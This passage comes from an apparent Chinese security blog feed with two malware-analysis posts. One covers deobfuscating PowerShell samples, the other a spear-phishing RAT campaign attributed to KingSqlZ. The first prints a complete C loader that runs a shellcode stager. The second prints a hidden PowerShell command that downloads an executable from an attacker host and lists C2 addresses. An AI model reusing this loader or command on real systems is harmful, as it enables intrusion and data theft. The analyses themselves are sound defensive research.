    <content type="html"><![CDATA[<a id="more"></a><h1 id="0x1-常见混淆"><a href="#0x1-常见混淆" class="headerlink" title="0x1 常见混淆"></a>0x1 常见混淆</h1><ul><li>基于大小写 ：hacky—&gt;HaCky</li><li>基于字符分割：’Ha’+’Cky’—&gt;HaCky</li><li>插入变量：’{0}{1}’-f ‘Ha’,’Kay’—&gt;HaCky</li><li>反引号：H`aCky—&gt;HaCky</li><li>基于命令转换(字符串转化为命令)&amp;(HaCky)—&gt;HaCky</li><li>基于空格或者ASCII</li></ul><h1 id="0x2-勒索软件"><a href="#0x2-勒索软件" class="headerlink" title="0x2 勒索软件"></a>0x2 勒索软件</h1><ul><li>解混淆能清除发现是AES加密<br>  <img src="http://hacky.wang/blog/20190629/XqfP84ygBUqt.png?imageslim" alt="mark"></li></ul><h1 id="0x3-流量欺骗"><a href="#0x3-流量欺骗" class="headerlink" title="0x3 流量欺骗"></a>0x3 流量欺骗</h1><ul><li>1.宏病毒释放处宏代码，如文件macro.vbs，查看宏代码，发现一段base64编码之后的数据，然后调用powershell执行，怀疑是一个powershell脚本</li><li>2.通过解base得到一个ps1脚本代码，命名为ByPowershell.ps1</li><li>3.通过分析，可以发现ByPowershell.ps1，利用powershell执行了一次-nop -noni -enc 命令，目的在于隐秘执行<br>  <img src="http://hacky.wang/blog/20190626/0rstQItBCLi5.png?imageslim" alt="mark"></li><li>4.解base64编码，得到FromPowershell.ps1_,可以观察到是利用利用virtuallAlloc执行shellcode</li><li>如果发现ps1脚本里面有shellcode，只需要用C语言内联shellcode字节，然后调试即可。如下是shellcode利用脚本<figure class="highlight cs"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span>(<span class="params"><span class="keyword">void</span></span>)</span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">printf(<span class="string">"hhhhh\n"</span>);</div><div class="line"><span class="keyword">char</span> shellcode[] = &#123;<span class="string">'\xfc'</span>,<span class="string">'\xe8'</span>,<span class="string">'\x82'</span>,<span class="string">'\x00'</span>,<span class="string">'\x00'</span>,<span class="string">'\x00'</span>,<span class="string">'\x60'</span>,<span class="string">'\x89'</span>,<span class="string">'\xe5'</span>,<span class="string">'\x31'</span>,<span class="string">'\xc0'</span>,<span class="string">'\x64'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x50'</span>,<span class="string">'\x30'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x52'</span>,<span class="string">'\x0c'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x52'</span>,<span class="string">'\x14'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x72'</span>,<span class="string">'\x28'</span>,<span class="string">'\x0f'</span>,<span class="string">'\xb7'</span>,<span class="string">'\x4a'</span>,<span class="string">'\x26'</span>,<span class="string">'\x31'</span>,<span class="string">'\xff'</span>,<span class="string">'\xac'</span>,<span class="string">'\x3c'</span>,<span class="string">'\x61'</span>,<span class="string">'\x7c'</span>,<span class="string">'\x02'</span>,<span class="string">'\x2c'</span>,<span class="string">'\x20'</span>,<span class="string">'\xc1'</span>,<span class="string">'\xcf'</span>,<span class="string">'\x0d'</span>,<span class="string">'\x01'</span>,<span class="string">'\xc7'</span>,<span class="string">'\xe2'</span>,<span class="string">'\xf2'</span>,<span class="string">'\x52'</span>,<span class="string">'\x57'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x52'</span>,<span class="string">'\x10'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x4a'</span>,<span class="string">'\x3c'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x4c'</span>,<span class="string">'\x11'</span>,<span class="string">'\x78'</span>,<span class="string">'\xe3'</span>,<span class="string">'\x48'</span>,<span class="string">'\x01'</span>,<span class="string">'\xd1'</span>,<span class="string">'\x51'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x59'</span>,<span class="string">'\x20'</span>,<span class="string">'\x01'</span>,<span class="string">'\xd3'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x49'</span>,<span class="string">'\x18'</span>,<span class="string">'\xe3'</span>,<span class="string">'\x3a'</span>,<span class="string">'\x49'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x34'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x01'</span>,<span class="string">'\xd6'</span>,<span class="string">'\x31'</span>,<span class="string">'\xff'</span>,<span class="string">'\xac'</span>,<span class="string">'\xc1'</span>,<span class="string">'\xcf'</span>,<span class="string">'\x0d'</span>,<span class="string">'\x01'</span>,<span class="string">'\xc7'</span>,<span class="string">'\x38'</span>,<span class="string">'\xe0'</span>,<span class="string">'\x75'</span>,<span class="string">'\xf6'</span>,<span class="string">'\x03'</span>,<span class="string">'\x7d'</span>,<span class="string">'\xf8'</span>,<span class="string">'\x3b'</span>,<span class="string">'\x7d'</span>,<span class="string">'\x24'</span>,<span class="string">'\x75'</span>,<span class="string">'\xe4'</span>,<span class="string">'\x58'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x58'</span>,<span class="string">'\x24'</span>,<span class="string">'\x01'</span>,<span class="string">'\xd3'</span>,<span class="string">'\x66'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x0c'</span>,<span class="string">'\x4b'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x58'</span>,<span class="string">'\x1c'</span>,<span class="string">'\x01'</span>,<span class="string">'\xd3'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x04'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x01'</span>,<span class="string">'\xd0'</span>,<span class="string">'\x89'</span>,<span class="string">'\x44'</span>,<span class="string">'\x24'</span>,<span class="string">'\x24'</span>,<span class="string">'\x5b'</span>,<span class="string">'\x5b'</span>,<span class="string">'\x61'</span>,<span class="string">'\x59'</span>,<span class="string">'\x5a'</span>,<span class="string">'\x51'</span>,<span class="string">'\xff'</span>,<span class="string">'\xe0'</span>,<span class="string">'\x5f'</span>,<span class="string">'\x5f'</span>,<span class="string">'\x5a'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x12'</span>,<span class="string">'\xeb'</span>,<span class="string">'\x8d'</span>,<span class="string">'\x5d'</span>,<span class="string">'\x68'</span>,<span class="string">'\x6e'</span>,<span class="string">'\x65'</span>,<span class="string">'\x74'</span>,<span class="string">'\x00'</span>,<span class="string">'\x68'</span>,<span class="string">'\x77'</span>,<span class="string">'\x69'</span>,<span class="string">'\x6e'</span>,<span class="string">'\x69'</span>,<span class="string">'\x54'</span>,<span class="string">'\x68'</span>,<span class="string">'\x4c'</span>,<span class="string">'\x77'</span>,<span class="string">'\x26'</span>,<span class="string">'\x07'</span>,<span class="string">'\xff'</span>,<span class="string">'\xd5'</span>,<span class="string">'\x31'</span>,<span class="string">'\xdb'</span>,<span class="string">'\x53'</span>,<span class="string">'\x53'</span>,<span class="string">'\x53'</span>,<span class="string">'\x53'</span>,<span class="string">'\x53'</span>,<span class="string">'\x68'</span>,<span class="string">'\x3a'</span>,<span class="string">'\x56'</span>,<span class="string">'\x79'</span>,<span class="string">'\xa7'</span>,<span class="string">'\xff'</span>,<span class="string">'\xd5'</span>,<span class="string">'\x53'</span>,<span class="string">'\x53'</span>,<span class="string">'\x6a'</span>,<span class="string">'\x03'</span>,<span class="string">'\x53'</span>,<span class="string">'\x53'</span>,<span class="string">'\x68'</span>,<span class="string">'\xbb'</span>,<span class="string">'\x01'</span>,<span class="string">'\x00'</span>,<span class="string">'\x00'</span>,<span class="string">'\xe8'</span>,<span class="string">'\xa7'</span>,<span class="string">'\x00'</span>,<span class="string">'\x00'</span>,<span class="string">'\x00'</span>,<span class="string">'\x2f'</span>,<span class="string">'\x4c'</span>,<span class="string">'\x37'</span>,<span class="string">'\x6c'</span>,<span class="string">'\x37'</span>,<span class="string">'\x46'</span>,<span class="string">'\x38'</span>,<span class="string">'\x51'</span>,<span class="string">'\x73'</span>,<span class="string">'\x64'</span>,<span class="string">'\x71'</span>,<span class="string">'\x4f'</span>,<span class="string">'\x68'</span>,<span class="string">'\x6b'</span>,<span class="string">'\x36'</span>,<span class="string">'\x43'</span>,<span class="string">'\x53'</span>,<span class="string">'\x39'</span>,<span class="string">'\x32'</span>,<span class="string">'\x6e'</span>,<span class="string">'\x6b'</span>,<span class="string">'\x35'</span>,<span class="string">'\x41'</span>,<span class="string">'\x4a'</span>,<span class="string">'\x58'</span>,<span class="string">'\x57'</span>,<span class="string">'\x54'</span>,<span class="string">'\x6e'</span>,<span class="string">'\x70'</span>,<span class="string">'\x6e'</span>,<span class="string">'\x75'</span>,<span class="string">'\x4d'</span>,<span class="string">'\x6e'</span>,<span class="string">'\x66'</span>,<span class="string">'\x48'</span>,<span class="string">'\x00'</span>,<span class="string">'\x50'</span>,<span class="string">'\x68'</span>,<span class="string">'\x57'</span>,<span class="string">'\x89'</span>,<span class="string">'\x9f'</span>,<span class="string">'\xc6'</span>,<span class="string">'\xff'</span>,<span class="string">'\xd5'</span>,<span class="string">'\x89'</span>,<span class="string">'\xc6'</span>,<span class="string">'\x53'</span>,<span class="string">'\x68'</span>,<span class="string">'\x00'</span>,<span class="string">'\x32'</span>,<span class="string">'\xe0'</span>,<span class="string">'\x84'</span>,<span class="string">'\x53'</span>,<span class="string">'\x53'</span>,<span class="string">'\x53'</span>,<span class="string">'\x57'</span>,<span class="string">'\x53'</span>,<span class="string">'\x56'</span>,<span class="string">'\x68'</span>,<span class="string">'\xeb'</span>,<span class="string">'\x55'</span>,<span class="string">'\x2e'</span>,<span class="string">'\x3b'</span>,<span class="string">'\xff'</span>,<span class="string">'\xd5'</span>,<span class="string">'\x96'</span>,<span class="string">'\x6a'</span>,<span class="string">'\x0a'</span>,<span class="string">'\x5f'</span>,<span class="string">'\x68'</span>,<span class="string">'\x80'</span>,<span class="string">'\x33'</span>,<span class="string">'\x00'</span>,<span class="string">'\x00'</span>,<span class="string">'\x89'</span>,<span class="string">'\xe0'</span>,<span class="string">'\x6a'</span>,<span class="string">'\x04'</span>,<span class="string">'\x50'</span>,<span class="string">'\x6a'</span>,<span class="string">'\x1f'</span>,<span class="string">'\x56'</span>,<span class="string">'\x68'</span>,<span class="string">'\x75'</span>,<span class="string">'\x46'</span>,<span class="string">'\x9e'</span>,<span class="string">'\x86'</span>,<span class="string">'\xff'</span>,<span class="string">'\xd5'</span>,<span class="string">'\x53'</span>,<span class="string">'\x53'</span>,<span class="string">'\x53'</span>,<span class="string">'\x53'</span>,<span class="string">'\x56'</span>,<span class="string">'\x68'</span>,<span class="string">'\x2d'</span>,<span class="string">'\x06'</span>,<span class="string">'\x18'</span>,<span class="string">'\x7b'</span>,<span class="string">'\xff'</span>,<span class="string">'\xd5'</span>,<span class="string">'\x85'</span>,<span class="string">'\xc0'</span>,<span class="string">'\x75'</span>,<span class="string">'\x08'</span>,<span class="string">'\x4f'</span>,<span class="string">'\x75'</span>,<span class="string">'\xd9'</span>,<span class="string">'\xe8'</span>,<span class="string">'\x4b'</span>,<span class="string">'\x00'</span>,<span class="string">'\x00'</span>,<span class="string">'\x00'</span>,<span class="string">'\x6a'</span>,<span class="string">'\x40'</span>,<span class="string">'\x68'</span>,<span class="string">'\x00'</span>,<span class="string">'\x10'</span>,<span class="string">'\x00'</span>,<span class="string">'\x00'</span>,<span class="string">'\x68'</span>,<span class="string">'\x00'</span>,<span class="string">'\x00'</span>,<span class="string">'\x40'</span>,<span class="string">'\x00'</span>,<span class="string">'\x53'</span>,<span class="string">'\x68'</span>,<span class="string">'\x58'</span>,<span class="string">'\xa4'</span>,<span class="string">'\x53'</span>,<span class="string">'\xe5'</span>,<span class="string">'\xff'</span>,<span class="string">'\xd5'</span>,<span class="string">'\x93'</span>,<span class="string">'\x53'</span>,<span class="string">'\x53'</span>,<span class="string">'\x89'</span>,<span class="string">'\xe7'</span>,<span class="string">'\x57'</span>,<span class="string">'\x68'</span>,<span class="string">'\x00'</span>,<span class="string">'\x20'</span>,<span class="string">'\x00'</span>,<span class="string">'\x00'</span>,<span class="string">'\x53'</span>,<span class="string">'\x56'</span>,<span class="string">'\x68'</span>,<span class="string">'\x12'</span>,<span class="string">'\x96'</span>,<span class="string">'\x89'</span>,<span class="string">'\xe2'</span>,<span class="string">'\xff'</span>,<span class="string">'\xd5'</span>,<span class="string">'\x85'</span>,<span class="string">'\xc0'</span>,<span class="string">'\x74'</span>,<span class="string">'\xcf'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x07'</span>,<span class="string">'\x01'</span>,<span class="string">'\xc3'</span>,<span class="string">'\x85'</span>,<span class="string">'\xc0'</span>,<span class="string">'\x75'</span>,<span class="string">'\xe5'</span>,<span class="string">'\x58'</span>,<span class="string">'\xc3'</span>,<span class="string">'\x5f'</span>,<span class="string">'\xe8'</span>,<span class="string">'\x77'</span>,<span class="string">'\xff'</span>,<span class="string">'\xff'</span>,<span class="string">'\xff'</span>,<span class="string">'\x31'</span>,<span class="string">'\x33'</span>,<span class="string">'\x38'</span>,<span class="string">'\x2e'</span>,<span class="string">'\x31'</span>,<span class="string">'\x32'</span>,<span class="string">'\x38'</span>,<span class="string">'\x2e'</span>,<span class="string">'\x31'</span>,<span class="string">'\x39'</span>,<span class="string">'\x36'</span>,<span class="string">'\x2e'</span>,<span class="string">'\x38'</span>,<span class="string">'\x34'</span>,<span class="string">'\x00'</span>,<span class="string">'\xbb'</span>,<span class="string">'\xf0'</span>,<span class="string">'\xb5'</span>,<span class="string">'\xa2'</span>,<span class="string">'\x56'</span>,<span class="string">'\x6a'</span>,<span class="string">'\x00'</span>,<span class="string">'\x53'</span>,<span class="string">'\xff'</span>,<span class="string">'\xd5'</span>&#125;;</div><div class="line">DWORD oldProtect = <span class="number">0</span>;</div><div class="line">VirtualProtect(shellcode, <span class="keyword">sizeof</span>(shellcode), PAGE_EXECUTE_READWRITE,&amp;oldProtect);</div><div class="line">((<span class="keyword">void</span>(*)(<span class="keyword">void</span>))&amp;shellcode)();</div><div class="line">VirtualProtect(shellcode, <span class="keyword">sizeof</span>(shellcode), oldProtect, &amp;oldProtect);</div><div class="line">getchar();</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></li></ul><h1 id="0x4-驱动人生样本"><a href="#0x4-驱动人生样本" class="headerlink" title="0x4 驱动人生样本"></a>0x4 驱动人生样本</h1><ul><li>1.得到样本g123.ps1，<code>Invoke-Expression</code>是一个可以将变量(字符串)当成可以执行的语句。正常情况下如果有此语句是不能显示代码语句的，但是我们可以使用<code>Write-Host</code>打印代码。在powershell中执行g123.ps1。可以发现代码被严重混淆。将其重定向输出成1.ps1即可<br>  <img src="http://hacky.wang/blog/20190629/E7015YVIThF9.png?imageslim" alt="mark"></li><li>2.但是仍然发现代码被混淆严重，但是可以发现代码的一些蛛丝马迹。看代码最后一行。它其中是以. (表达式)(表达式)来执行的。可以联想到Invoke-Expression。看到在&amp; ((GV ‘<em>mDr</em>‘).nAME[3,11,2]-joiN’’)之前有个管道符。使用<code>Out-File .\tmp.log</code>重定向即可。得到2.ps1<br>  <img src="http://hacky.wang/blog/20190629/3aIiKnEUJr3L.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190629/7Vgnc0a8TVuQ.png?imageslim" alt="mark"></li><li>2.ps1和1.ps1是一样的。使用<code>Out-File .\tmp.log</code>解决，得到3.ps1.</li><li>3.3.ps1换了一种混淆方式，但是处理是一样的。 <code>($sHELLiD[1]+$ShelLiD[13]+&#39;X&#39;)</code>可以猜测是IEX。解混淆得到4.ps1.<br>  <img src="http://hacky.wang/blog/20190629/uGmvm4Po1BuL.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190629/FHPzGfssxIKj.png?imageslim" alt="mark"><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2></li><li>遇到混淆了的powershell，除了常规的字符替换之类的方法，还有三种方法可以解混淆。<ul><li>1.遇上Base64加密的，可以将<code>Invoke-Expression</code>修改为<code>Write-Host</code>即可。</li><li>2.出现在结尾的IEX字段，这时候，可以利用输出重定向，使用<code>Out-File .\tmp.log</code>.<strong>重点是查看是否有管道符</strong></li><li>3.出现在起始部分IEX字段，例如<code>. ( $EnV:CoMsPec[4,26,25]-JoIN&#39;&#39;)(((&#39;[string]3CHav = U&#39;+&#39;ABUAB[string]....</code>。只需要修改语句为<code>Write-Host</code>即可。</li></ul></li><li>备注：解混淆需要活学活用。重点是寻找<code>Invoke-Expression</code>字段</li><li>参考：<a href="https://paper.seebug.org/826/" target="_blank" rel="external">https://paper.seebug.org/826/</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h1 id=&quot;0x1-常见混淆&quot;&gt;&lt;a href=&quot;#0x1-常见混淆&quot; class=&quot;headerlink&quot; title=&quot;0x1 常见混淆&quot;&gt;&lt;/a&gt;0x1 常见混淆&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;基于大小写 ：hacky—&amp;gt;HaCky
      
    
    </summary>
    
      <category term="windows系统" scheme="http://yoursite.com/categories/windows%E7%B3%BB%E7%BB%9F/"/>
    
    
  </entry>
  
  <entry>
    <title>针对KingSqlZ组织一次攻击的分析报告</title>
    <link href="http://yoursite.com/2019/05/30/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF_21_%E9%92%88%E5%AF%B9KingSqlZ%E7%BB%84%E7%BB%87%E4%B8%80%E6%AC%A1%E6%94%BB%E5%87%BB%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/"/>
    <id>http://yoursite.com/2019/05/30/病毒分析技术_21_针对KingSqlZ组织一次攻击的分析报告/</id>
    <published>2019-05-30T07:02:11.000Z</published>
    <updated>2019-05-31T16:02:09.845Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0 前言"></a>0x0 前言</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;近期，启明星辰ADLab监测到一批疑似针对西班牙语地区的政府机构及能源企业等部门的定向攻击活动。通过对攻击者的行为和所用服务器相关信息的分析和追踪，确定该次攻击来源于一批隐秘多年的土耳其黑客组织-KingSqlZ组织。该组织是一个民族主义色彩非常浓厚的黑客组织，曾攻下其他国家的3千多个网站服务器，并高调的在被攻击网站上留下其组织的名称，随后消失了多年。 如今通过研究人员的追踪再次挖出该黑客组织的活动迹象。此次攻击活动通过构造恶意Office Word文档并配合鱼叉邮件发起定向攻击，以“简历更新”作为诱饵文档向攻击目标植入间谍木马，从事情报收集、远控监视及系统破坏等恶意行动。在本次攻击过程中，该组织采用渗透手段攻下多台服务器并将其作为存放攻击代码的跳板。【转】</p><h1 id="0x1-目录"><a href="#0x1-目录" class="headerlink" title="0x1 目录"></a>0x1 目录</h1><ul><li>1.目录</li><li>2.IoC</li><li>3.行为分析</li><li>4.样本分析</li><li>5.yara规则</li><li>6.后记<a id="more"></a></li></ul><h1 id="0x2-IoC"><a href="#0x2-IoC" class="headerlink" title="0x2 IoC"></a>0x2 IoC</h1><h2 id="0x2-1-Hash"><a href="#0x2-1-Hash" class="headerlink" title="0x2.1 Hash"></a>0x2.1 Hash</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;本次一共截获了两个和<code>KingSqlZ</code>组织有关的可疑样本，其中有一个是一个doc样本，通过使用宏进行文件传播，IOC如下：</p><ul><li>样本名称：4fb43047463380ae25cb7684433f6a7e4f4b8b1669048291aca20182877a2810.doc</li><li>样本Hash：4fb43047463380ae25cb7684433f6a7e4f4b8b1669048291aca20182877a2810</li><li>样本类型：ole文件(带宏)</li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;另外一个是一个PE文件。IOC如下：</p><ul><li>样本名称：298ee13829733e23557b5f0db3d93768c0665260be17dc9010288d33ca6fe77f.exe</li><li>样本Hash：298ee13829733e23557b5f0db3d93768c0665260be17dc9010288d33ca6fe77f</li><li>是否加壳：无壳</li><li>编译语言：maybe C++ Visual Studio 201x or Asm demo/example  [DebuG]</li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;以及这两个样本释放的其他样本的IOC(不包括内存转储): </p><ul><li>2d69c9a9622b9b812db1833caec237995eedd0dee59ece53bd359e7083023f47</li><li>9211473ae545a0248b4ef4bb1bea1acffc1ec85ecb42194984266416720a7f73</li><li>c242bfb6aa6d47087d77d25955bd48a5421fb0353049828ec99d44e119874b7a</li><li>7a01dd19b5a74e7023d19a19065f49fb013c9f0f7fee974d717d46a8369b8e60</li></ul><h2 id="0x2-2-C2"><a href="#0x2-2-C2" class="headerlink" title="0x2.2 C2"></a>0x2.2 C2</h2><ul><li><a href="http://www.gestomarket.co/ylqrg54.exe" target="_blank" rel="external">http://www.gestomarket.co/ylqrg54.exe</a></li><li>asdfwrkhl.warzonedns.com</li><li>linksysdatakeys.se</li><li>67.228.235.93</li><li>187.136.91.177</li><li>187.155.84.184</li><li>31.13.73.17</li><li>67.228.235.93</li><li>31.13.73.23</li><li>74.86.228.110</li><li>187.155.84.184</li><li>69.171.239.11</li><li>187.155.47.67</li><li>66.220.147.47</li><li>31.13.86.1</li><li>31.13.75.17:2404</li><li>备注：这些主机本身不具备相关性，因为他们都是由于被该组织渗透成为该组织攻击的跳板</li></ul><h1 id="0x3-行为分析"><a href="#0x3-行为分析" class="headerlink" title="0x3 行为分析"></a>0x3 行为分析</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;名称统一使用Hash的前几个字符加后缀的方式命名。主要操作是远控类木马。<br>    <img src="http://hacky.wang/blog/20190530/zfiD0zF422xh.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190530/NMcvDW1urtq1.png?imageslim" alt="mark"></p><h1 id="0x4-样本分析"><a href="#0x4-样本分析" class="headerlink" title="0x4 样本分析"></a>0x4 样本分析</h1><h2 id="0x4-1-4fb430-doc"><a href="#0x4-1-4fb430-doc" class="headerlink" title="0x4.1 4fb430.doc"></a>0x4.1 4fb430.doc</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;是一个doc宏病毒样本，通过使用oledump获取其中的宏代码。<br>    <img src="http://hacky.wang/blog/20190530/l2Ice0RMALU1.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;发现宏代码被混淆严重，去混淆结合沙箱的结果推测具体行为如下：</p><ul><li>宏代码调用cmd，解密其中的十进制数据。</li><li><p>接着调用powershell。下载massive.exe</p><figure class="highlight less"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">powershell</span><span class="selector-class">.exe</span> <span class="selector-tag">-w</span> <span class="selector-tag">hidden</span> <span class="selector-tag">-ep</span> <span class="selector-tag">bypass</span> (New-Object System.Net.WebClient)<span class="selector-class">.DownloadFile</span>(<span class="string">'http://www.gestomarket.co/ylqrg54.exe'</span>,$<span class="attribute">env</span>:temp + <span class="string">'\massive.exe'</span>);</div></pre></td></tr></table></figure></li><li><p>运行massive.exe</p></li></ul><h2 id="0x4-2-massive-exe"><a href="#0x4-2-massive-exe" class="headerlink" title="0x4.2 massive.exe"></a>0x4.2 massive.exe</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先这个样本是一个C#程序，使用ILSpy查看源代码。<br>    <img src="http://hacky.wang/blog/20190530/rkhvbmpQjVhj.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;将程序定位到关键的地方。发现这个样本也只是一个外壳程序，用于从攻击跳板上获取攻击代码，然后将其写入我们的内存中，从内存中执行攻击代码，实现了无文件落地，有效规避了查杀。<br>    <img src="http://hacky.wang/blog/20190530/u09pkDcBrOJm.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190530/wR9hnpBJDbgA.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;使用进程替换技术，先创建一个和自身相同的子进程，然后使用进程替换进程，执行我们的攻击代码。但是由于C#不好被调试，所以将其子进程转储得到我们落地的攻击样本如下，命名为DumpFrommassive.exe<br>    <img src="http://hacky.wang/blog/20190530/mp7iQpXKuVJS.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190530/2gGU9cAKIwzX.png?imageslim" alt="mark"></p><h2 id="0x4-3-DumpFrommassive-exe"><a href="#0x4-3-DumpFrommassive-exe" class="headerlink" title="0x4.3 DumpFrommassive.exe"></a>0x4.3 DumpFrommassive.exe</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;创建一个互斥体，然后获取多个API函数地址<br>    <img src="http://hacky.wang/blog/20190530/bUiMGz4QEXFt.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接着判断是否是X64系统，然后通过注册表<code>SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProductName</code>获取系统的版本信息。<br>    <img src="http://hacky.wang/blog/20190530/3oiXdAdSpEXy.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当判断是xp系统，就去获取HKEY_CURRENT_USER\origmsc数据，但是分析机器上未发现这样的键。<br>    <img src="http://hacky.wang/blog/20190530/lKj49BU7dEGh.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;利用注册表HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System 关闭UAC通知<br>    <img src="http://hacky.wang/blog/20190530/ALsYol1VFhuN.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过当前的环境变量获取特殊目录的路径<br>    <img src="http://hacky.wang/blog/20190530/lybJLCwmYw1P.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;获取目标进程的相关信息包括模块和32/64位进程，这个进程是由于注册表中的数据决定。<br>    <img src="http://hacky.wang/blog/20190530/wUI0RvgdTI3u.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;由于转储很多静态数据丢失，过于细节的数据没有办法复现。<br>    <img src="http://hacky.wang/blog/20190530/4BYRLn86fTlC.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190530/LqlaGfeqXxjp.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190530/Ue0MCgcw2SuL.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;由于该组织使用渗透的方式，得到多台服务器的控制权，让这些服务器充当此次攻击的跳板机和C2<br>    <img src="http://hacky.wang/blog/20190530/Ke9KPR9QMmPE.png?imageslim" alt="mark"><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过设置键盘钩子的形式，记录键盘输入，和剪切板数据<br>    <img src="http://hacky.wang/blog/20190530/qD0A3MylalqU.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190530/DxqaAw6ecywb.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190530/7F5srRvuzn0v.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190530/CGxKazGvJTT3.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;创建新线程，执行截图<br>    <img src="http://hacky.wang/blog/20190530/yR8IoRHbpfTh.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190530/bwfBwvH3izqg.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190530/NqOv2wDPzsuM.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190530/MJ2nzNziucMo.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;创建新线程进行音视频传输<br>    <img src="http://hacky.wang/blog/20190530/NBjXKoTsQtxs.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;清空主流浏览器的COOKIE和保存的表单(账户和密码)，这样就可以在用户重新输入密码的时候记录下来。<br>    <img src="http://hacky.wang/blog/20190530/HCE8Qibkbqgn.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190530/htwCe5roCz9E.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;获取用户名，机器名称，主要是识别作用<br>    <img 